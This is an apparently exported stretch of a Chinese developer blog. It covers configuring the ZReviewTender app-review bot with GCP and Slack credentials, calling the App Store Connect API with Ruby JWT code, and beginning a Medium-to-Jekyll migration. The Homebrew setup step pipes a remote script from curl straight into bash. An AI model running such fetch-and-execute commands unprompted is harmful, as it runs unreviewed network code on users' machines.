Apple(iOS/macOS App) App： ZReviewTender -a編輯完成後點擊右上方「Start commit」選擇「Commit changes」儲存設定。手動觸發執行 ZReviewTender參考前文「6. 初始化 ZReviewTender (手動觸發執行一次)」使用 Gem 安裝如果熟悉 Gems 可以直接使用以下指令安裝 ZReviewTendergem install ZReviewTender使用 Gem 安裝 (不熟悉 Ruby/Gems)如果不熟悉 Ruby or Gems 可以 Follow 以下步驟 Step by Step 安裝 ZReviewTender macOS 雖自帶 Ruby，但建議使用 rbenv or rvm 安裝新的 Ruby 及管理 Ruby 版本 (我使用 2.6.5 ) 使用 rbenv or rvm 安裝 Ruby 2.6.5，並切換至 rbenv/rvm 的 Ruby 使用 which ruby 確認當前使用的 Ruby 非 /usr/bin/ruby 系統 Ruby Ruby 環境 Ok 後使用以下指令安裝 ZReviewTendergem install ZReviewTender部署 — 想自行擴充功能手動 git clone ZReviewTender Source Code 確認 &amp; 完善 Ruby 環境 進入目錄，執行 bundle install ZReviewTender 安裝相關依賴Processor 建立方式可參考後面文章內容。設定ZReviewTender — 使用 yaml 檔設定 Apple/Google 評價機器人。[推薦] 直接使用文章下方的執行指令 — 「產生設定檔案」:ZReviewTender -i直接產生空白的 apple.yml &amp; android.yml 設定檔。Apple (iOS/macOS App)參考 apple.example.yml 檔案： ⚠️ 下載下來 apple.example.yml 後記得將檔名改成 apple.ymlapple.yml:platform: 'apple'appStoreConnectP8PrivateKeyFilePath: '' # APPLE STORE CONNECT API PRIVATE .p8 KEY File PathappStoreConnectP8PrivateKeyID: '' # APPLE STORE CONNECT API PRIVATE KEY IDappStoreConnectIssueID: '' # APPLE STORE CONNECT ISSUE IDappID: '' # APP ID...appStoreConnectIssueID： App Store Connect -&gt; Keys -&gt; App Store Connect API Issuer ID: appStoreConnectIssueIDappStoreConnectP8PrivateKeyID &amp; appStoreConnectP8PrivateKeyFilePath： Name: ZReviewTender Access: App Manager appStoreConnectP8PrivateKeyID: Key ID appStoreConnectP8PrivateKeyFilePath: /AuthKey_XXXXXXXXXX.p8 ，Download API Key，並將檔案放入與 config yml 同目錄下。appID:appID: App Store Connect -&gt; App Store -&gt; General -&gt; App Information -&gt; Apple IDGCP Service AccountZReviewTender 所使用到的 Google API 服務 (撈取商城評價、Google 翻譯、Google Sheet) 都是使用 Service Account 驗證方式。可先依照 官方步驟建立 GCP &amp; Service Account 下載保存 GCP Service Account 身份權限金鑰 ( *.json )。 如要使用自動翻譯功能請確認 GCP有啟用 Cloud Translation API 和使用的 Service Account 也有加入 如要使用記錄到 Google Sheet 功能請確認 GCP 有啟用 Google Sheets API 、 Google Drive API 和使用的 Service Account 也有加入Google Play Console (Android App)參考 android.example.yml 檔案： ⚠️ 下載下來 android.example.yml 後記得將檔名改成 android.ymlandroid.yml:platform: 'android'packageName: '' # Android App Package NamekeyFilePath: '' # Google Android Publisher API Credential .json File PathplayConsoleDeveloperAccountID: '' # Google Console Developer Account IDplayConsoleAppID: '' # Google Console App ID......packageName:packageName: com.XXXXX 可於 Google Play Console -&gt; Dashboard -&gt; App 中取得playConsoleDeveloperAccountID &amp; playConsoleAppID:可由 Google Play Console -&gt; Dashboard -&gt; App 頁面網址中取得：https://play.google.com/console/developers/ playConsoleDeveloperAccountID /app/ playConsoleAppID /app-dashboard將用於組合評價訊息連結，讓團隊可以點擊連結快速進入後台評價回覆頁面。keyFilePath:最重要的資訊，GCP Service Account 身份權限金鑰 ( *.json )需要按照 官方文件 步驟，建立 Google Cloud Project &amp; Service Account 並到 Google Play Console -&gt; Setup -&gt; API Access 中完成啟用 Google Play Android Developer API ＆連結專案，到 GCP 點擊下載服務帳戶的 JSON 金鑰。JSON 金鑰範例內容如下：gcp_key.json:{ \"type\": \"service_account\", \"project_id\": \"XXXX\", \"private_key_id\": \"XXXX\", \"private_key\": \"-----BEGIN PRIVATE KEY-----\\nXXXX\\n-----END PRIVATE KEY-----\\n\", \"client_email\": \"XXXX@XXXX.iam.gserviceaccount.com\", \"client_id\": \"XXXX\", \"auth_uri\": \"https://accounts.google.com/o/oauth2/auth\", \"token_uri\": \"https://oauth2.googleapis.com/token\", \"auth_provider_x509_cert_url\": \"https://www.googleapis.com/oauth2/v1/certs\", \"client_x509_cert_url\": \"https://www.googleapis.com/robot/v1/metadata/x509/XXXX.iam.gserviceaccount.com\"} keyFilePath: /gcp_key.json 金鑰檔案路徑，將檔案放入與 config yml 同目錄下。Processorsprocessors: - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't needed it. class: \"GoogleTranslateProcessor\" enable: false # enable googleTranslateAPIKeyFilePath: '' # Google Translate API Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"TWN\",\"CHN\"] # Review origin Territory (language) that you don't want to translate. - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review message in 1 slack message. slackBotToken: \"\" # Slack Bot Token, send slack message throught Slack Bot. slackBotTargetChannel: \"\" # Slack Bot Token, send slack message throught Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Comming WebHook URL, Send slack message throught In-Comming WebHook, not recommended, deprecated. ...More Processors...ZReviewTender 自帶四個 Processor，先後順序會影響到資料處理流程 FilterProcessor-&gt;GoogleTranslateProcessor-&gt;SlackProcessor-&gt; GoogleSheetProcessor。FilterProcessor:依照指定條件過濾撈取的評價，只處理符合條件的評價。 class: FilterProcessor 無需調整，指向 lib/Processors/ FilterProcessor .rb enable: true / false 啟用此 Processor or Not keywordsInclude: [“ 關鍵字1 ”,“ 關鍵字2 ”…] 篩選出內容包含這些關鍵字的評價 ratingsInclude: [ 1 , 2 …] 1~5 篩選出包含這些評價分數的評價 territoriesInclude: [“ zh-hant ”,” TWN ”…] 篩選出包含這些地區(Apple)或語系(Android)的評價GoogleTranslateProcessor:將評價翻譯成指定語言。 class: GoogleTranslateProcessor 無需調整，指向 lib/Processors/ GoogleTranslateProcessor .rb enable: true / false 啟用此 Processor or Not googleTranslateAPIKeyFilePath: /gcp_key.json GCP Service Account 身份權限金鑰 File Path *.json ，將檔案放入與 config yml 同目錄下，內容範例可參考上方 Google Play Console JSON 金鑰範例。(請確認該 JSON key 之 service account 有 Cloud Translation API 使用權限) googleTranslateTargetLang: zh-TW 、 en …目標翻譯語言 googleTranslateTerritoriesExclude: [“ zh-hant ”,” TWN ”…] 不需翻譯的地區(Apple)或語系(Android)SlackProcessor:轉發評價到 Slack。 class: SlackProcessor 無需調整，指向 lib/Processors/ SlackProcessor .rb enable: true / false 啟用此 Processor or Not slackTimeZoneOffset: +08:00 評價時間顯示時區 slackAttachmentGroupByNumber: 1 設定幾則 Reviews 合併成同一則訊息，加速發送；預設 1 則 Review 1 則 Slack 訊息。 slackBotToken: xoxb-xxxx-xxxx-xxxx Slack Bot Token ，Slack 建議建立一個 Slack Bot 包含 postMessages Scope 並使用其發送 Slack 訊息 slackBotTargetChannel: CXXXXXX 群組 ID ( 非群組名稱 )，Slack Bot 要發送到哪個 Channel 群組；且 需要把你的 Slack Bot 加入到該群組 slackInCommingWebHookURL: https://hooks.slack.com/services/XXXXX 使用舊的 InComming WebHookURL 發送訊息到 Slack，注意！Slack 不建議再繼續使用此方法發送訊息。 Please note, this is a legacy custom integration — an outdated way for teams to integrate with Slack. These integrations lack newer features and they will be deprecated and possibly removed in the future. We do not recommend their use. Instead, we suggest that you check out their replacement: Slack apps . slackBotToken 與 slackInCommingWebHookURL，SlackProcessor 會優選選擇使用 slackBotTokenGoogleSheetProcessor紀錄評價到 Google Sheet。 class: GoogleSheetProcessor 無需調整，指向 lib/Processors/ SlackProcessor .rb enable: true / false 啟用此 Processor or Not googleSheetAPIKeyFilePath: /gcp_key.json GCP Service Account 身份權限金鑰 File Path *.json ，將檔案放入與 config yml 同目錄下，內容範例可參考上方 Google Play Console JSON 金鑰範例。(請確認該 JSON key 之 service account 有 Google Sheets API 、 Google Drive API 使用權限) googleSheetTimeZoneOffset: +08:00 評價時間顯示時區 googleSheetID: Google Sheet ID 可由 Google Sheet 網址中取得：https://docs.google.com/spreadsheets/d/ googleSheetID / googleSheetName: Sheet 名稱, e.g. Sheet1 keywordsInclude: [“ 關鍵字1 ”,“ 關鍵字2 ”…] 篩選出內容包含這些關鍵字的評價 ratingsInclude: [ 1 , 2 …] 1~5 篩選出包含這些評價分數的評價 territoriesInclude: [“ zh-hant ”,” TWN ”…] 篩選出包含這些地區(Apple)或語系(Android)的評價 values: [ ] 評價資訊的欄位組合%TITLE% 評價標題%BODY% 評價內容%RATING% 評價分數 1~5%PLATFORM% 評價來源平台 Apple or Android%ID% 評價ID%USERNAME% 評價%URL% 評價前往連結%TERRITORY% 評價地區(Apple)或評價語系(Android)%APPVERSION% 被評價的 App 版本%CREATEDDATE% 評價建立日期例如我的 Google Sheet 欄位如下：評價分數,評價標題,評價內容,評價資訊則 values 可設定成：values: [\"%TITLE%\",\"%BODY%\",\"%RATING%\",\"%PLATFORM% - %APPVERSION%\"]自訂 Processor 串接自己的工作流程若需要自訂 Processor 請改用手動部署，因 gem 上的 ZReviewTender 已打包無法動態調整。您可參考 lib/Processors/ProcessorTemplate.rb 建立您的擴充功能:$lib = File.expand_path('../lib', File.dirname(__FILE__))require \"Models/Review\"require \"Models/Processor\"require \"Helper\"require \"ZLogger\"# Add to config.yml:## processors:# - ProcessorTemplate:# class: \"ProcessorTemplate\"# parameter1: \"value\"# parameter2: \"value\"# parameter3: \"value\"# ...#class ProcessorTemplate &lt; Processor def initialize(config, configFilePath, baseExecutePath) # init Processor # get paraemter from config e.g. config[\"parameter1\"] # configFilePath: file path of config file (apple.yml/android.yml) # baseExecutePath: user excute path end def processReviews(reviews, platform) if reviews.length &lt; 1 return reviews end ## do what your want to do with reviews... ## return result reviews return reviews endendinitialize 會給予: config Object: 對應 config yml 內的設定值 configFilePath: 使用的 config yml 檔案路徑 baseExecutePath: 使用者在哪個路徑執行 ZReviewTenderprocessReviews(reviews, platform):爬取完新評價後，會進入這個 function 讓 Processor 有機會處理，處理完請 return 結果的 Reviews。Review 資料結構定義在 lib/Models/ Review.rb附註XXXterritorXXX 參數： Apple 使用地區：TWM/JPN… Android 使用語系：zh-hant/en/…若不需要某個 Processor： 可以設定 enable: false 或是直接移除該 Processor Config Block。Processors 執行順序可依照您的需求自行調整： e.g. 先執行 Filter 再執行翻譯再執行 Slack 再執行 Log to Google Sheet…執行 ⚠️ 使用 Gem 可直接下 ZReviewTender ，若為手動部署專案請使用 bundle exec ruby bin/ZReviewTender 執行。產生設定檔案：ZReviewTender -i從 apple.example.yml &amp; android.example.yml 產生 apple.yml &amp; android.yml 到當前執行目錄的 config/ 目錄下。執行 Apple &amp; Android 評價爬取：ZReviewTender -r 默認讀取 /config/ 下 apple.yml &amp; android.yml 設定執行 Apple &amp; Android 評價爬取 &amp; 指定設定檔目錄：ZReviewTender --run=設定檔目錄 默認讀取 /config/ 下 apple.yml &amp; android.yml 設定只執行 Apple 評價爬取：ZReviewTender -a 默認讀取 /config/ 下 apple.yml 設定只執行 Apple 評價爬取 &amp; 指定設定檔位置：ZReviewTender --apple=apple.yml設定檔位置只執行 Android 評價爬取：ZReviewTender -g 默認讀取 /config/ 下 android.yml 設定只執行 Android 評價爬取 &amp; 指定設定檔位置：ZReviewTender --googleAndroid=android.yml設定檔位置清除執行紀錄回到初始設定ZReviewTender -d會刪除 /latestCheckTimestamp 裡的 Timestamp 紀錄檔案，回到初始狀態，再次執行爬取會再次收到 init success 訊息:當前 ZReviewTender 版本ZReviewTender -v顯示當前 ZReviewTender 再 RubyGem 上的最新版本號。更新 ZReviewTender 到最新版 (rubygem only)ZReviewTender -n第一次執行第一次執行成功會發送初始化成功訊息到指定 Slack Channel，並在執行相應目錄下產生 latestCheckTimestamp/Apple , latestCheckTimestamp/Android 檔案紀錄最後爬取的評價 Timestamp。另外還會產生一個 execute.log 紀錄執行錯誤。設定排程持續執行設定排程定時( crontab )持續執行爬取新評價，ZReviewTender 會爬取 latestCheckTimestamp 上次爬取的評價 Timestamp 到這次爬取時間內的新評價，並更新 Timestamp 紀錄檔案。e.g. crontab: 15 */6 * * * ZReviewTender -r另外要注意因為 Android API 只提供查詢近 7 天新增或編修的評價，所以排成週期請勿超過 7 天，以免有評價遺漏。https://developers.google.com/android-publisher/reply-to-reviews#retrieving_a_set_of_reviewsGithub Action 部署ZReviewTender App Reviews Automatic Botname: ZReviewTenderon: workflow_dispatch: schedule: - cron: \"15 */6 * * *\" #每六小時跑一次，可參照上方 crontab 自行更改設定jobs: ZReviewTender: runs-on: ubuntu-latest steps: - name: ZReviewTender Automatic Bot uses: ZhgChgLi/ZReviewTender@main with: command: '-r' #執行 Apple &amp; iOS App 評價檢查，可參照上方改成其他執行指令⚠️️️️️ 再次警告！務必確保你的設定檔及金鑰無法被公開存取，因其中的敏感資訊可能導致 App/Slack 權限被盜用；作者不對被盜用負任何責任。如果有發生意外的錯誤，請 建立一個 Issue 附上紀錄資訊，將會盡快修正！Done使用教學結束，再來是幕後開發祕辛分享。=========================與 App Reviews 的戰爭本以為去年總結的 AppStore APP’s Reviews Slack Bot 那些事 及運用相關技術實現的 ZReviewsBot — Slack App Review 通知機器人 ，與整合 App 最新評價進入公司工作流程這件事就告一段落了；沒想到 Apple 居然在今年 更新了 App Store Connect API ，讓這件事能持續演進。去年總結出來的 Apple iOS/macOS App 撈取評價的解決方案： Public URL API (RSS) ⚠️: 無法彈性篩選、給的資訊也少、有數量上限、還有我們偶爾會遇到資料錯亂問題，很不穩定；官方未來可能棄用 透過 Fastlane — SpaceShip 幫我們封裝複雜的網頁操作、Session 管理，去 App Store Connection 網站後台撈取評價資料 (等於是起一個網頁模擬器爬蟲去後台爬資料)。依照去年做法就只能使用方法二來達成，但效果不太完美；Session 會過期，需要人工定期更新，且無法放在 CI/CD Server 上，因為 IP 一變 Session 會馬上過期。important-note-about-session-duration by Fastlane今年收到 Apple 更新了 App Store Connect API 消息後立馬著手重新設計新的評價機器人，除了改用官方 API 外；還優化了之前的架構設計及更熟悉 Ruby 用法。App Store Connect API 開發上遇到的問題 List All Customer Reviews for an App 這個 Endpoint 不會給 App 版本資訊很詭異，只能 workaround 先打這個 endpoint 篩出最新評價，再打 List All App Store Versions for an App &amp; List All Customer Reviews for an App Store Version 組合出 App 版本資訊。AndroidpublisherV3 開發上遇到的問題 API 不提供取得所有評價列表的方法，只能取得近 7 天新增/編修的評價。 同樣使用 JWT 串接 Google API (不依賴相關類別庫 e.g. google-apis-androidpublisher_v3) 附上個 Google API JWT 產生&amp;使用範例：require \"jwt\"require \"time\"payload = { iss: \"GCP API 身份權限金鑰 (*.json) 檔案中的 client_email 欄位\", sub: \"GCP API 身份權限金鑰 (*.json) 檔案中的 client_email 欄位\", scope: [\"https://www.googleapis.com/auth/androidpublisher\"]].join(' '), aud: \"GCP API 身份權限金鑰 (*.json) 檔案中的 token_uri 欄位\", iat: Time.now.to_i, exp: Time.now.to_i + 60*20}rsa_private = OpenSSL::PKey::RSA.new(\"GCP API 身份權限金鑰 (*.json) 檔案中的 private_key 欄位\")token = JWT.encode payload, rsa_private, 'RS256', header_fields = {kid:\"GCP API 身份權限金鑰 (*.json) 檔案中的 private_key_id 欄位\", typ:\"JWT\"}uri = URI(\"API 身份權限金鑰 (*.json) 檔案中的 token_uri 欄位\")https = Net::HTTP.new(uri.host, uri.port)https.use_ssl = truerequest = Net::HTTP::Post.new(uri)request.body = \"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Ajwt-bearer&amp;assertion=#{token}\"response = https.request(request).read_bodybearer = result[\"access_token\"]### use bearer tokenuri = URI(\"https://androidpublisher.googleapis.com/androidpublisher/v3/applications/APP_PACKAGE_NAME/reviews\")https = Net::HTTP.new(uri.host, uri.port)https.use_ssl = true request = Net::HTTP::Get.new(uri)request['Authorization'] = \"Bearer #{bearer}\"; response = https.request(request).read_body result = JSON.parse(response)# success!有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,212 Total Views Last Statistics Date: 2025-01-19 | 966 Views on Medium. " }, { "title": "App Store Connect API 現已支援 讀取和管理 Customer Reviews", "url": "/posts/f1365e51902c/", "categories": "ZRealm Dev.", "tags": "ios-app-development, app-store-connect, api, app-review, integration", "date": "2022-07-20 22:50:44 +0800", "snippet": "App Store Connect API 現已支援 讀取和管理 Customer ReviewsApp Store Connect API 2.0+ 全面更新，支援 In-app purchases、Subscriptions、Customer Reviews 管理2022/07/19 NewsUpcoming transition from the XML feed to the App...", "content": "App Store Connect API 現已支援 讀取和管理 Customer ReviewsApp Store Connect API 2.0+ 全面更新，支援 In-app purchases、Subscriptions、Customer Reviews 管理2022/07/19 NewsUpcoming transition from the XML feed to the App Store Connect API今早收到 Apple 開發者最新消息 ，App Store Connect API 新增支援 In-app purchases、Subscriptions、Customer Reviews 管理三項功能；讓開發者可以更彈性的將 Apple 開發流程與 CI/CD 或是商業後台做更密切、有效率的整合！In-app purchases、Subscriptions 我沒碰，Customer Reviews 讓我興奮不已，之前發表過一篇「 AppStore APP’s Reviews Slack Bot 那些事 」探討 App 評價與工作流程整合的方式。Slack 評價機器人 — ZReviewsBot在 App Store Connect API 還沒支援之前，只有兩種方法能獲取 iOS App 評價：一 是 透過訂閱 Public RSS 取得，但是此 RSS 無法讓人彈性篩選、給的資訊也少、有數量上限、還有我們偶爾會遇到資料錯亂問題，很不穩定二 是 透過 Fastlane — SpaceShip 幫我們封裝複雜的網頁操作、Session 管理，去 App Store Connection 網站後台撈取評價資料 (等於是起一個網頁模擬器爬蟲去後台爬資料)。 好處是資料齊全、穩定，我們串接了一年沒有遇到任何資料問題。 壞處是 Session 每個月都會過期，要手動重新登入，而且 Apple ID 目前全面都要綁定 2FA 驗證，所以這段也要手動完成，這樣才能產出有效的 Session；另外 Session 如果產的跟用的 IP 不一樣會馬上過期 (因此很難將機器人放上不固定 IP 的網路服務)。important-note-about-session-duration by Fastlane 每個月不定時過期，要不定時去更新，時間久了真的很煩；而且這個 「 Know How 」其實不好交接給其他同事。 但因為沒有其他方法，所以也只能這樣，直到今天早上收到消息…. ⚠️ 注意：官方預計在 2022/11 取消原本的 XML (RSS) 存取方式。2022/08/10 Update我已基於新的 App Store Connect API 開發了新的 「 ZReviewTender — 免費開源的 App Reviews 監控機器人 」App Store Connect API 2.0+ Customer Reviews 試玩建立 App Store Connect API Key首先我們要登入 App Store Connect 後台，前往「Users and Access」-&gt;「Keys」-&gt;「 App Store Connect API 」：點擊「+」，輸入名稱和權限；權限細則可參考官網說明，為了減少測試問題，這邊先選擇「App Manager」把權限開到最大。點擊右方「Download API Key」下載保存你的「AuthKey_XXX.p8」Key。 ⚠️ 注意：這個 Key 只能下載一次請 妥善保存 ，若遺失只能 Revoke 現有的 &amp; 重新建立。⚠️ ⚠️ 切勿外洩 .p8 Key File⚠️App Store Connect API 存取方式curl -v -H 'Authorization: Bearer [signed token]' \"https://api.appstoreconnect.apple.com/v1/apps\"Signed Token (JWT, JSON Web Token) 產生方式參考 官方文件 。 JWT Header：{kid:\"YOUR_KEY_ID\", typ:\"JWT\", alg:\"ES256\"}YOUR_KEY_ID ：參考上圖。 JWT Payload：{ iss: 'YOUR_ISSUE_ID', iat: TOKEN 建立時間 (UNIX TIMESTAMP e.g 1658326020), exp: TOKEN 失效時間 (UNIX TIMESTAMP e.g 1658327220), aud: 'appstoreconnect-v1'}YOUR_ISSUE_ID ：參考上圖。exp TOKEN 失效時間 ：會因為不同存取功能或設定有不同的時間限制，有的可以永久、有的超過 20 分鐘即失效，需要重新產生，詳細可參考 官方說明 。使用 JWT.IO 或是以下附的 Ruby 範例產生 JWTjwt.rb:require 'jwt'require 'time'keyFile = File.read('./AuthKey_XXXX.p8') # YOUR .p8 private key file pathprivateKey = OpenSSL::PKey::EC.new(keyFile)payload = { iss: 'YOUR_ISSUE_ID', iat: Time.now.to_i, exp: Time.now.to_i + 60*20, aud: 'appstoreconnect-v1' }token = JWT.encode payload, privateKey, 'ES256', header_fields={kid:\"YOUR_KEY_ID\", typ:\"JWT\"}puts tokendecoded_token = JWT.decode token, privateKey, true, { algorithm: 'ES256' }puts decoded_token Ruyb JWT 工具在此： https://github.com/jwt/ruby-jwt最終會得到類似以下的 JWT 結果：4oxjoi8j69rHQ58KqPtrFABBWHX2QH7iGFyjkc5q6AJZrKA3AcZcCFoFMTMHpM.pojTEWQufMTvfZUW1nKz66p3emsy2v5QseJX5UJmfRjpxfjgELUGJraEVtX7tVg6aicmJT96q0snP034MhfgoZAB46MGdtC6kv2Vj6VeL2geuXG87Ys6ADijhT7mfHUcbmLPJPNZNuMttcc.fuFAJZNijRHnCA2BRqq7RZEJBB7TLsm1n4WM1cW0yo67KZp-Bnwx9y45cmH82QPAgKcG-y1UhRUrxybi5b9iNN打看看？有了 Token 我們就能來打看看 App Store Connect API！curl -H 'Authorization: Bearer JWT' \"https://api.appstoreconnect.apple.com/v1/apps/APPID/customerReviews\" APPID 可從 App Store Connect 後台取得：或是 App 商城頁面： https://apps.apple.com/tw/app/pinkoi/id557252416 APPID = 557252416 成功！🚀 我們現在可以使用這個方式撈取 App 評價，資料完整且可以完全交給機器執行，不需人工例行維護 (JWT 雖會過期，但是 Private Key 不會，我們每次請求都可藉由 Private Key 簽名產生 JWT 去存取即可)。 其他篩選參數、操作方法請參考 官方文件 。 ⚠️ 您只能存取您有權限的 App 評價資料⚠️完整 Ruby 測試專案用一個 Ruby 檔案做了以上流程，可直接 Clone 下來填入資料即可測試使用。首次打開：bundle install開始使用：bundle exec ruby jwt.rbNext同理我們可以透過 API 去存取管理 ( API Overview )： [New] Customer reviews [New] Subscriptions [New] In-App Purchases [New] Xcode Cloud Workflows And Builds [Updated] Improving your App’s Performance TestFlight Users And Roles App Clips App Management App Metadata Pricing And Availability Provisioning Sales and Trends有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,728 Total Views Last Statistics Date: 2025-01-19 | 1,583 Views on Medium. " }, { "title": "無痛轉移 Medium 到自架網站", "url": "/posts/a0c08d579ab1/", "categories": "ZRealm Dev.", "tags": "ios-app-development, jekyll, github-actions, medium, self-hosted", "date": "2022-07-17 00:00:47 +0800", "snippet": "無痛轉移 Medium 到自架網站將 Medium 內容搬遷至 Github Pages (with Jekyll/Chirpy)zhgchg.li背景經營 Medium 的第四年，已累積超過 65 篇文章，將近 1000+ 小時的時間心血；當初會選擇 Medium 的原因是簡單方便，可以很好的把心思放在撰寫文章上，不需要去管其他的事；在此之前曾經嘗試過自架 Wordpress，但都把心思放...", "content": "無痛轉移 Medium 到自架網站將 Medium 內容搬遷至 Github Pages (with Jekyll/Chirpy)zhgchg.li背景經營 Medium 的第四年，已累積超過 65 篇文章，將近 1000+ 小時的時間心血；當初會選擇 Medium 的原因是簡單方便，可以很好的把心思放在撰寫文章上，不需要去管其他的事；在此之前曾經嘗試過自架 Wordpress，但都把心思放在弄環境、樣式、Plguin 這些事情上，感覺怎麼調整都不滿意，調整好後又發現載入太慢、閱讀體驗不佳、後台撰寫文章介面也不夠人性化，然後就沒怎麼在更新了。隨著在 Medium 撰寫的文章越來越多、累積了一些流量與追蹤者後，又開始想自己掌握著這些成果，而不是被第三方平台掌控 (e.g Medium 關站心血全沒)，所以從前年開始就一直在尋覓第二備份網站，會持續經營 Medium 但也會同步把內容發佈到自己能掌控的網站上；當時找到的解決方案是 — Google Site 但老實說只能當成個人「入口網站」使用，文章撰寫界面功能有限，無法真的把所有文章心血搬過去。最終還是走回自架的的道路，不同的是採用的並非動態網站(e.g. wordpress)，而是靜態網站；相較之下能支援的功能較少，但是我要的就是文章撰寫功能跟簡潔流暢可客製化的瀏覽體驗，其他都不需要！靜態網站的工作流程是：在本地使用 Markdown 格式撰寫好文章，然後將其透過靜態網站引擎轉換為 靜態網頁 上傳到伺服器，即完成；靜態網頁，瀏覽體驗快速！使用 Markdown 格式寫作，可以讓文章兼容更多不同平台；如不習慣，也可以找線上或線下的 Markdown 撰寫工具，體驗就跟直接在 Medium 撰寫一樣！。綜合以上，這個方案可以達成我希望流暢的瀏覽體驗及方便的撰寫界面兩個維度的需求。成果zhgchg.li 支援客製化顯示樣式 支援客製化頁面調整 (e.g. 插入廣告、js widget) 支援自訂頁面 支援自訂域名 靜態化頁面載入快速、瀏覽體驗佳 使用 Git 版本控制，文章所有的歷史版本都能保留恢復 全自動定時自動同步 Medium 文章到網站2025/01/18 Update 🎉🎉🎉 請參考快速使用 Medium to Jekyll 設定教學 請參考快速使用 Medium to Jekyll 設定教學 請參考快速使用 Medium to Jekyll 設定教學環境及工具 環境語言 ：Ruby 依賴管理工具 ： RubyGems.org 、 Bundler 靜態網站引擎 ： Jekyll (Based on Ruby) 文章格式 ：Markdown 伺服器 ： Github Page (免費、無限流量/容量 靜態網站伺服器) CI/CD ： Github Action (免費 2,000 mins+/月) Medium 文章轉換 Markdown 工具 ： ZMediumToMarkdown (Based on Ruby) 版本控制 ： Git (可選) Git GUI ： Git Fork (可選) 網域服務 ： Namecheap安裝 Ruby這邊只以我的環境為例，其他作業系統版本請 Google 如何安裝 Ruby 。 macOS Monterey 12.1 rbenv ruby 2.6.5安裝 Brew/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"在 Terminal 輸入以上指令安裝 Brew。安裝 rbenvbrew install rbenv ruby-buildMacOS 雖自帶 Ruby 但建議使用 rbenv 安裝另一個 Ruby 與系統自帶的區隔開來，在 Terminal 輸入以上指令安裝 rbenv。rbenv init在 Terminal 輸入以上指令初始化 rbenv 關閉＆重新打開 Terminal。在 Terminal 輸入 rbenv 檢查是否安裝成功！成功！使用 rbenv 安裝 Rubyrbenv install 2.6.5在 Terminal 輸入以上指令安裝 Ruby 2.6.5 版本。rbenv global 2.6.5在 Terminal 輸入以上指令將 Terminal 所使用的 Ruby 版本從系統自帶的切換到 rbenv 的版本。在 Terminal 輸入 rbenv versions 查看當前設定：在 Terminal 輸入 ruby -v 查看當前 Ruby、 gem -v 查看當前 RubyGems 狀況： *Ruby 安裝完後理應也安裝好 RubyGems 了。成功！安裝 Jekyll &amp; Bundler &amp; ZMediumToMarkdowngem install jekyll bundler ZMediumToMarkdown在 Terminal 輸入以上指令安裝 Jekyll &amp; Bundler &amp; ZMediumToMarkdown。完成！從模版建立 Jekyll Blog預設的 Jekyll Blog 樣式非常簡潔，我們可以從以下網站找到自己喜歡的樣式並套用： GitHub.com #jekyll-theme repos jamstackthemes.dev jekyllthemes.org jekyllthemes.io jekyll-themes.com安裝方式一般使用 gem-based themes ，也有的 Repo 提供 Fork 方式安裝；甚至是提供直接一鍵安裝方式；總之每個模板的安裝方式可能有所不同，請參閱模板的教學使用。 另外要注意，因我們要部署到 Github Pages 上，依據官方文件所說並非所有模板都能適用。Chirpy 模版這邊就以我 Blog 採用的模版 Chirpy 為示範，此模版提供最傻瓜的一鍵安裝方式，可以直接使用。 其他模版比較少有提供類似的一鍵安裝，在不熟悉 Jeklly、Github Pages 的情況下先使用此模版是比較好入門的方式；日後有機會再更新文章講其他的模版安裝方式。 另外在 Github 上找可以直接 Fork 的模版也可以(e.g. al-folio )直接使用，如果都不是，是需要自己手動安裝的模版就要自行研究如何設定 Github Pages 部署，這邊我稍微研究了一下沒成功，待日後有結果再回來文章補充分享。從 Git Template 建立 Git Repohttps://github.com/cotes2020/chirpy-starter/generate Repository name： Github帳號/組織名稱.github.io ( 務必使用這個格式 ) 務必選擇「Public」公開 Repo點擊「Create repository from template」完成 Repo 建立。Git Clone 專案git clone git@github.com:zhgchgli0718/zhgchgli0718.github.io.gitgit clone 剛剛建立的 Repo。執行 bundle 安裝依賴：執行 bundle lock — add-platform x86_64-linux 鎖定版本修改網站設定打開 _config.yml 設定檔案進行設定：# The Site Configuration# Import the themetheme: jekyll-theme-chirpy# Change the following value to '/PROJECT_NAME' ONLY IF your site type is GitHub Pages Project sites# and doesn't have a custom domain.# baseurl: ''# The language of the webpage › http://www.lingoes.net/en/translator/langcode.htm# If it has the same name as one of the files in folder `_data/locales`, the layout language will also be changed,# otherwise, the layout language will use the default value of 'en'.lang: en# Additional parameters for datetime localization, optional. › https://github.com/iamkun/dayjs/tree/dev/src/localeprefer_datetime_locale:# Change to your timezone › http://www.timezoneconverter.com/cgi-bin/findzone/findzonetimezone:# jekyll-seo-tag settings › https://github.com/jekyll/jekyll-seo-tag/blob/master/docs/usage.md# ↓ --------------------------title: ZhgChgLi # the main titletagline: Live a life you will remember. # it will display as the sub-titledescription: &gt;- # used by seo meta and the atom feed ZhgChgLi iOS Developer 求知若渴 教學相長 更愛電影/美劇/西音/運動/生活# fill in the protocol &amp; hostname for your site, e.g., 'https://username.github.io'url: 'https://zhgchg.li'github: username: ZhgChgLi # change to your github usernametwitter: username: zhgchgli # change to your twitter usernamesocial: # Change to your full name. # It will be displayed as the default author of the posts and the copyright owner in the Footer name: ZhgChgLi email: zhgchgli@gmail.com # change to your email address links: - https://medium.com/@zhgchgli - https://github.com/ZhgChgLi - https://www.linkedin.com/in/zhgchgligoogle_site_verification: # fill in to your verification string# ↑ --------------------------# The end of `jekyll-seo-tag` settingsgoogle_analytics: id: G-6WZJENT8WR # fill in your Google Analytics ID # Google Analytics pageviews report settings pv: proxy_endpoint: # fill in the Google 